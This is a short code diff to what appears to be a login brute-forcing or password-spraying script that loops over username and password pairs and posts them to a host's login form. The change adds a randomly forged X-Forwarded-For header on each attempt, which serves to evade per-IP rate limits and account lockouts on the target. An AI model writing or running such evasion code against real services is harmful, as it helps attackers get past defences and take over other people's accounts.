@@ -357,6 +357,12 @@ def run(host, title="", quiet=False, kind="", budget=CAP, pause=PAUSE, login="")
 
     for i, (user, pwd) in enumerate(pairs, 1):
         try:
+            sess.headers["X-Forwarded-For"] = "%d.%d.%d.%d" % (
+                random.randint(11, 223), random.randint(0, 255),
+                random.randint(0, 255), random.randint(1, 254))
+        except Exception:
+            pass
+        try:
             r = _post(host, form, user, pwd, sess)
         except Exception as e:
             if "timed out" in str(e).lower() or "timeout" in str(e).lower():
